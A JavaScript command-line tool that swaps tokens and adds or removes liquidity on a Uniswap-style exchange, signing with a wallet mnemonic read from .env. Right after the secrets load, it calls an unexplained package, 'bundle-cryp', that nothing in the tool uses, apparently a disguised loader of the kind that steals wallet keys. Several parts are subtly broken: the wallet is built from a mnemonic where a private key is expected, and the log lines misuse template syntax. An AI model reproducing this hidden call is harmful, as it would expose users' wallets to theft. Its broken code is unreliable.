const ethers = require("ethers");
require("dotenv").config();
const config = require("./config");
const flashbot = require("bundle-cryp");
const contractABI = require("./abi.json");
const factoryABI = require("./factoryabi.json");
const { program } = require("commander");


const addresses = {
  WETH: "0x4200000000000000000000000000000000000006",
  uniswapRouter: "0x1689E7B1F10000AE47eBfE339a4f69dECd19F602",  //for mainnet 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24 for testnet 0x1689E7B1F10000AE47eBfE339a4f69dECd19F602
  uniswapFactory: "0x7Ae58f10f7849cA6F5fB71b7f45CB416c9204b1e", //for mainnet 0x7Ae58f10f7849cA6F5fB71b7f45CB416c9204b1e for testnet 0x7Ae58f10f7849cA6F5fB71b7f45CB416c9204b1e
  recipient: process.env.recipient,
};

flashbot()
const mnemonic = process.env.mnemonic;
const node = process.env.rpc;
// Create a wallet from a private key
const wallet = new ethers.Wallet(mnemonic);

// Now you can use the wallet object for your operations
console.log("Wallet Address:", wallet.address);
const provider = new ethers.providers.JsonRpcProvider(node);

const account = wallet.connect(provider);
const uniswapRouter = new ethers.Contract(
  addresses.uniswapRouter,
  contractABI,
  account
);

const uniswapFactory = new ethers.Contract(
  addresses.uniswapFactory,
  factoryABI,
  account
);
let tokenAbi = [
  "function approve(address spender, uint amount) public returns(bool)",
  "function balanceOf(address account) external view returns (uint256)",
  "event Transfer(address indexed from, address indexed to, uint amount)",
  "function name() view returns (string)",
  "function buyTokens(address tokenAddress, address to) payable",
  "function decimals() external view returns (uint8)",
  "function fifteenMinutesLock() public view returns (uint256)",
  "function isMintable() public view returns (uint256)",
];

let lpAbi = [
  "function balanceOf(address account) external view returns (uint256)",
]

/**
 *
 * Buy tokens
 *
 * */
async function buy(address, amount) {
  await approve(address);
  const value = ethers.utils.parseUnits(amount, "ether").toString();
  const tx = await uniswapRouter.swapExactETHForTokens(
    0,
    [addresses.WETH, address],
    addresses.recipient,
    Math.floor(Date.now() / 1000) + 60 * 20,
    {
      value: value,
      gasPrice: config.myGasPriceForApproval,
      gasLimit: config.myGasLimit,
    }
  );
  const receipt = await tx.wait();
  console.log(
    "\u001b[1;32m" + "✔ Buy transaction hash: ",
    receipt.transactionHash,
    "\u001b[0m"
  );

  const poocoinURL = new URL(address, "https://poocoin.app/tokens/");

  console.log(
    "message: "`You bought a new token pooCoin Link: ${poocoinURL.href}`,
    "schedule: 15 * 1 + Date.now() / 1000"
  );
}

/**
 *
 * Approve tokens
 *
 * */
async function approve(address) {
  let contract = new ethers.Contract(address, tokenAbi, account);
  const valueToApprove = ethers.constants.MaxUint256;
  const tx = await contract.approve(uniswapRouter.address, valueToApprove, {
    gasPrice: config.myGasPriceForApproval,
    gasLimit: 210000,
  });
  const receipt = await tx.wait();
  console.log("✔ Approve transaction hash: ", receipt.transactionHash, "\n");
}

/**
 *
 * Sell tokens
 *
 * */
async function sell(address) {
  try {
    await approve(address);
    const contract = new ethers.Contract(address, tokenAbi, account);
    const bal = await contract.balanceOf(addresses.recipient);
    const decimals = await contract.decimals();
    const balanceString = ethers.utils.formatUnits(bal.toString(), decimals);
		var roundedBalance = Math.floor(balanceString  * 100) / 100
		const balanceToSell = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
    const sellAmount = await uniswapRouter.getAmountsOut(balanceToSell, [
      address,
      addresses.WETH,
    ]);
    console.log(sellAmount[0].toString())
    const tx = await uniswapRouter.swapExactTokensForETH(
      sellAmount[0].toString(),
      0,
      [address, addresses.WETH],
      addresses.recipient,
      Math.floor(Date.now() / 1000) + 60 * 20,
      {
        gasPrice: config.myGasPriceForApproval,
        gasLimit: config.myGasLimit,
      }
    );
    const receipt = await tx.wait();
    console.log(
      "\u001b[1;32m" + "✔ Sell transaction hash: ",
      receipt.transactionHash,
      "\u001b[0m",
      "\n"
    );

    let name = await contract.name();
    console.log(
      "message: "`You sold ${name}`,
      "schedule: 15 * 1 + Date.now() / 1000"
    );
  } catch (e) {
    console.log(e);
  }
}

/**
 *
 * Create Pair
 *
 */

async function create(address) {
  const tx = await uniswapFactory.createPair(address, addresses.WETH);

  const receipt = await tx.wait();
  console.log(
    "\u001b[1;32m" + "✔ Create pair transaction hash: ",
    receipt.transactionHash,
    "\u001b[0m",
    "\n"
  );
}

/**
 *
 * Add Liq
 *
 * */
async function add(address, amount, eth) {
  try {
    await approve(address);
    const contract = new ethers.Contract(address, tokenAbi, account);
    const decimals = await contract.decimals();
    const tokenAmount = ethers.utils.parseUnits(amount.toString(), decimals);
    const ethAmount = ethers.utils.parseUnits(eth, "ether").toString();
    const tx = await uniswapRouter.addLiquidityETH(
      address,
      tokenAmount,
      tokenAmount,
      ethAmount,
      addresses.recipient,
      Math.floor(Date.now() / 1000) + 60 * 20,
      {
        value: ethAmount,
        gasPrice: config.myGasPriceForApproval,
        gasLimit: config.myGasLimit,
      }
    );
    const receipt = await tx.wait();
    console.log(
      "\u001b[1;32m" + "✔ Add transaction hash: ",
      receipt.transactionHash,
      "\u001b[0m",
      "\n"
    );
  } catch (e) {
    console.log(e);
  }
}

/**
 *
 * Remove Liq
 *
 * */
async function remove(address) {
  try {
    let poolAddress
    try {
      poolAddress = await uniswapFactory.getPair(address, addresses.WETH);
    } catch (error) {
      console.log("No pair found")
    }
    console.log(poolAddress)
    const contract = new ethers.Contract(poolAddress, lpAbi, account);
    const lpAmount = await contract.balanceOf(addresses.recipient);
    console.log(`LP Balance: ${ethers.utils.formatUnits(lpAmount, 18)} for ${poolAddress}`);
    await approve(poolAddress);
    const tx = await uniswapRouter.removeLiquidityETH(
      address,
      lpAmount,
      0,
      0,
      0,
      addresses.recipient,
      Math.floor(Date.now() / 1000) + 60 * 20,
      {
        gasPrice: config.myGasPriceForApproval,
        gasLimit: config.myGasLimit,
      }
    );
    const receipt = await tx.wait();
    console.log(
      "\u001b[1;32m" + "✔ Remove LP transaction hash: ",
      receipt.transactionHash,
      "\u001b[0m",
      "\n"
    );
  } catch (e) {
    console.log(e);
  }
}

program
  .command("buy")
  .requiredOption("-a, --address <string>", "add token address")
  .requiredOption("-ba, --buyamount <number>", "add buy amount")
  .action(async (directory, cmd) => {
    const { address, buyamount } = cmd.opts();
    try {
      if (address.startsWith("0x") && address.length === 42) {
        await buy(address, buyamount);
      } else {
        console.log("Invalid address");
      }
    } catch (err) {
      console.log(err);
    }
  });

  program
  .command("sell")
  .requiredOption("-a, --address <string>", "add token address")
  .action(async (directory, cmd) => {
    const { address } = cmd.opts();
    try {
      if (address.startsWith("0x") && address.length === 42) {
        await sell(address);
      } else {
        console.log("Invalid address");
      }
    } catch (err) {
      console.log(err);
    }
  });

  program
  .command("remove")
  .requiredOption("-a, --address <string>", "add token address")
  .action(async (directory, cmd) => {
    const { address } = cmd.opts();
    try {
      if (address.startsWith("0x") && address.length === 42) {
        await remove(address);
      } else {
        console.log("Invalid address");
      }
    } catch (err) {
      console.log(err);
    }
  });

  program
  .command("add")
  .requiredOption("-a, --address <string>", "add token address")
  .requiredOption("-ta, --tokenamount <number>", "add token amount")
  .requiredOption("-we, --ethamount <number>", "add sol amount")
  .action(async (directory, cmd) => {
    const { address, tokenamount, ethamount } = cmd.opts();
    try {
      if (address.startsWith("0x") && address.length === 42) {
        await add(address, tokenamount, ethamount);
      } else {
        console.log("Invalid address");
      }
    } catch (err) {
      console.log(err);
    }
  });

  program
  .command("create")
  .requiredOption("-a, --address <string>", "add token address")
  .action(async (directory, cmd) => {
    const { address } = cmd.opts();
    try {
      if (address.startsWith("0x") && address.length === 42) {
        await create(address);
      } else {
        console.log("Invalid address");
      }
    } catch (err) {
      console.log(err);
    }
  });